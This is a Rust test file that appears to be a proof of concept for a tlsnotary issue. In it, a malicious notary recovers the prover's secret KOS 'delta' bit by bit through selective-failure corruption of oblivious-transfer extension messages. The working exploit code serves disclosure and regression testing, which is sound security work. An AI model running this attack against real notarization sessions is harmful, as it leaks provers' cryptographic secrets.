//! PoC: a malicious notary samples the prover's KOS `delta` by selective
//! failure.
//!
//! Context — tlsnotary/tlsn#1173. The MPC deps give each RCOT consumer its own
//! KOS instance, all sharing one global `delta`. On the notary side the mpc and
//! mpc-tls receivers are *raw* `kos::Receiver`s (no ferret wrapper) paired with
//! the prover's `delta`-holding senders. This test plays the notary as a
//! malicious KOS receiver and shows it can read `delta` **bit by bit**.
//!
//! Mechanism (independent of the domain-separation salt). During extension the
//! sender folds the receiver's `u` message into its `q` **only** for the base
//! columns where `delta` is set:
//!
//! ```text
//! q_col_i ^= if delta_i { u_col_i } else { 0 }
//! ```
//!
//! So if the receiver corrupts one base column `i` of the `u` bytes it puts on
//! the wire (keeping its own state honest), the corruption reaches the sender's
//! consistency check iff `delta_i == 1`:
//!
//! * `delta_i == 0` → check passes, the session completes normally, the corrupt
//!   column is never used → the notary silently learns the bit is 0.
//! * `delta_i == 1` → check aborts → the notary learns the bit is 1.
//!
//! Either way one bit of `delta` leaks per instance. This is orthogonal to the
//! `instance_id` salt (PR domain-separation): the salt only reseeds the setup
//! PRGs; it does not change the `delta`-gated fold, so the oracle is
//! unaffected. We run every instance WITH a non-zero salt to make that
//! explicit.
//!
//! Severity note: `delta` is fresh per notarization and only a handful of raw
//! KOS receivers share it, so a real session leaks only a few bits of an
//! ephemeral `delta` (each `1` bit costing a detectable abort). This PoC runs
//! one instance per bit purely to demonstrate that the oracle is complete.

use mpz_core::Block;
use mpz_ot_core::{
    kos::{CSP, Extend, Receiver, ReceiverConfig, Sender, SenderConfig},
    rcot::{RCOTReceiver, RCOTSender},
};
use rand::{Rng, SeedableRng};
use rand_chacha::ChaCha12Rng;

const COUNT: usize = 128;

/// `delta`'s bits in the same LSB-0 order KOS indexes its base columns by.
fn lsb0_bits(block: Block) -> Vec<bool> {
    block
        .to_bytes()
        .iter()
        .flat_map(|byte| (0..8).map(move |i| (byte >> i) & 1 == 1))
        .collect()
}

/// The receiver is the base-OT sender, so it chooses both seeds per column; the
/// paired KOS sender obliviously holds the one selected by its `delta` bit.
fn sender_seeds_for(delta: Block, receiver_seeds: &[[Block; 2]; CSP]) -> [Block; CSP] {
    lsb0_bits(delta)
        .into_iter()
        .zip(receiver_seeds.iter())
        .map(|(b, pair)| if b { pair[1] } else { pair[0] })
        .collect::<Vec<_>>()
        .try_into()
        .unwrap()
}

/// One KOS instance: prover as honest `delta`-holding sender, notary as a
/// malicious receiver that corrupts base column `target` of the `u` bytes it
/// sends. Returns whether the prover's consistency check accepted.
fn notary_probe(
    delta: Block,
    instance_id: Block,
    receiver_seeds: [[Block; 2]; CSP],
    target: usize,
) -> bool {
    let sender_seeds = sender_seeds_for(delta, &receiver_seeds);
    let mut prover = Sender::new(SenderConfig::default(), delta, instance_id).setup(sender_seeds);
    let mut notary = Receiver::new(ReceiverConfig::default(), instance_id).setup(receiver_seeds);

    prover.alloc(COUNT).unwrap();
    notary.alloc(COUNT).unwrap();

    while notary.wants_extend() {
        let honest = notary.extend().unwrap();

        // The notary controls the bytes it puts on the wire. Serialize the honest
        // `Extend`, flip one byte of the target column, and send that instead.
        // The notary's own state stays honest, so its later check message is
        // honest — only the prover's `q` for `target` is corrupted.
        let mut bytes = bincode::serialize(&honest).unwrap();
        let us_len = bytes.len() - 16; // bincode: u64 count, u64 us.len(), then us
        let row_width = us_len / CSP;
        bytes[16 + target * row_width] ^= 0xff;
        let tampered: Extend = bincode::deserialize(&bytes).unwrap();

        prover.extend(tampered).unwrap();
    }

    let chi_seed = prover.check_start();
    let notary_check = notary.check(chi_seed).unwrap();
    prover.check(notary_check).is_ok()
}

#[test]
fn malicious_notary_samples_prover_delta_bit_by_bit() {
    // The prover's per-session global delta (unknown to the notary).
    let delta: Block = ChaCha12Rng::seed_from_u64(2).random::<[u8; 16]>().into();
    let delta_bits = lsb0_bits(delta);

    // A non-zero domain-separation salt is in force for every instance, exactly
    // as the domain-separation PR applies it — the leak is unaffected.
    let instance_id = Block::new(2u128.to_le_bytes());

    let mut recovered = vec![false; CSP];
    for i in 0..CSP {
        // Fresh base OT each instance (the honest thing); the attack does not
        // rely on reuse.
        let mut rng = ChaCha12Rng::seed_from_u64(1000 + i as u64);
        let receiver_seeds: [[Block; 2]; CSP] =
            std::array::from_fn(|_| [rng.random(), rng.random()]);

        let accepted = notary_probe(delta, instance_id, receiver_seeds, i);
        // accept => delta bit is 0; abort => delta bit is 1.
        recovered[i] = !accepted;

        assert_eq!(
            accepted, !delta_bits[i],
            "column {i}: prover accepted iff its delta bit is 0"
        );
    }

    assert_eq!(
        recovered, delta_bits,
        "malicious notary recovered the prover's delta bit-for-bit"
    );
}
